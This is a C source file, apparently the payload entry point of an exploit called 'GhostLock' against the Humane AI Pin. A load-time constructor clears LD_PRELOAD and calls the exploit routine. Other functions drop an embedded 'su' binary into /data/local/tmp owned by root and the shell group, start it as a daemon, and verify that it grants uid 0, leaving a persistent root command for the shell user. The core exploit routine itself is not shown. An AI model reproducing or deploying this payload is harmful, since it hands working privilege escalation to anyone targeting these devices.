/*
 * SPDX-License-Identifier: Apache-2.0
 *
 * Humane AI Pin payload entry point and transient root-command installer.
 * This target intentionally writes only below /data/local/tmp. It never
 * mounts a filesystem or changes a boot partition.
 */
#include "common.h"

#define ROOT_CLIENT_DIR "/data/local/tmp"
#define ROOT_CLIENT_NAME "su"
#define ROOT_CLIENT_PATH ROOT_CLIENT_DIR "/" ROOT_CLIENT_NAME
#define ROOT_SOCKET_PATH ROOT_CLIENT_DIR "/.ghostlock-su.sock"
#define AID_SHELL 2000

extern const unsigned char embedded_su_start[];
extern const unsigned char embedded_su_end[];

static int write_all(int fd, const unsigned char *data, size_t length) {
  while (length != 0) {
    ssize_t written = write(fd, data, length);
    if (written < 0 && errno == EINTR) {
      continue;
    }
    if (written <= 0) {
      return 0;
    }
    data += (size_t)written;
    length -= (size_t)written;
  }
  return 1;
}

static int install_root_client(void) {
  int directory = open(ROOT_CLIENT_DIR,
                       O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
  if (directory < 0) {
    return 0;
  }

  char temporary[64];
  snprintf(temporary, sizeof(temporary), ".ghostlock-su.%ld.tmp",
           (long)getpid());
  (void)unlinkat(directory, temporary, 0);

  int output = openat(directory, temporary,
                      O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC | O_NOFOLLOW,
                      0700);
  if (output < 0) {
    close(directory);
    return 0;
  }

  const unsigned char *begin = embedded_su_start;
  size_t length = (size_t)(embedded_su_end - embedded_su_start);
  int ok = length != 0 && write_all(output, begin, length);
  if (ok) {
    ok = fchown(output, 0, AID_SHELL) == 0 &&
         fchmod(output, S_IRUSR | S_IWUSR | S_IXUSR |
                         S_IRGRP | S_IXGRP) == 0 &&
         fsync(output) == 0;
  }

  int saved_errno = errno;
  if (close(output) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (ok && renameat(directory, temporary, directory, ROOT_CLIENT_NAME) != 0) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    (void)unlinkat(directory, temporary, 0);
  }
  close(directory);
  errno = saved_errno;

  if (ok) {
    pr_success("root client installed bytes=%zu path=%s\n",
               length, ROOT_CLIENT_PATH);
  }
  return ok;
}

static void redirect_daemon_stdio(void) {
  int nullfd = open("/dev/null", O_RDWR | O_CLOEXEC);
  if (nullfd < 0) {
    return;
  }
  (void)dup2(nullfd, STDIN_FILENO);
  (void)dup2(nullfd, STDOUT_FILENO);
  (void)dup2(nullfd, STDERR_FILENO);
  if (nullfd > STDERR_FILENO) {
    close(nullfd);
  }
}

static pid_t launch_root_daemon(void) {
  (void)unlink(ROOT_SOCKET_PATH);
  pid_t child = fork();
  if (child != 0) {
    return child;
  }

  if (setsid() < 0) {
    _exit(120);
  }
  redirect_daemon_stdio();
  long fd_limit = sysconf(_SC_OPEN_MAX);
  if (fd_limit < 0 || fd_limit > 4096) {
    fd_limit = 4096;
  }
  for (int fd = STDERR_FILENO + 1; fd < fd_limit; ++fd) {
    close(fd);
  }
  execl(ROOT_CLIENT_PATH, "su", "--daemon", (char *)NULL);
  _exit(121);
}

static int wait_for_root_daemon(pid_t daemon_pid) {
  for (unsigned int attempt = 0; attempt < 60; ++attempt) {
    if (kill(daemon_pid, 0) != 0) {
      return 0;
    }
    if (access(ROOT_SOCKET_PATH, F_OK) == 0) {
      pid_t probe = fork();
      if (probe == 0) {
        execl(ROOT_CLIENT_PATH, "su", "-c",
              "test \"$(id -u)\" = 0 && test \"$(id -g)\" = 0",
              (char *)NULL);
        _exit(122);
      }
      if (probe < 0) {
        return 0;
      }
      int status = 0;
      while (waitpid(probe, &status, 0) < 0) {
        if (errno != EINTR) {
          return 0;
        }
      }
      if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 1;
      }
    }
    usleep(100000);
  }
  errno = ETIMEDOUT;
  return 0;
}

int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid != NULL) {
    *daemon_pid = -1;
  }
  if (!install_root_client()) {
    return 0;
  }

  pid_t child = launch_root_daemon();
  if (child <= 0) {
    return 0;
  }
  if (!wait_for_root_daemon(child)) {
    int saved_errno = errno;
    (void)kill(child, SIGKILL);
    (void)waitpid(child, NULL, 0);
    (void)unlink(ROOT_SOCKET_PATH);
    errno = saved_errno;
    return 0;
  }

  if (daemon_pid != NULL) {
    *daemon_pid = child;
  }
  pr_success("root daemon ready pid=%d socket=%s peer_uids=0,%d\n",
             child, ROOT_SOCKET_PATH, AID_SHELL);
  return 1;
}

__attribute__((constructor)) static void ghostlock_entry(void) {
  static int entered;
  if (entered) {
    return;
  }
  entered = 1;
  unsetenv("LD_PRELOAD");

  char *arguments[] = {"ghostlock-aipin", NULL};
  pr_success("GhostLock payload starting pid=%d\n", getpid());
  (void)run_exploit(1, arguments);
}
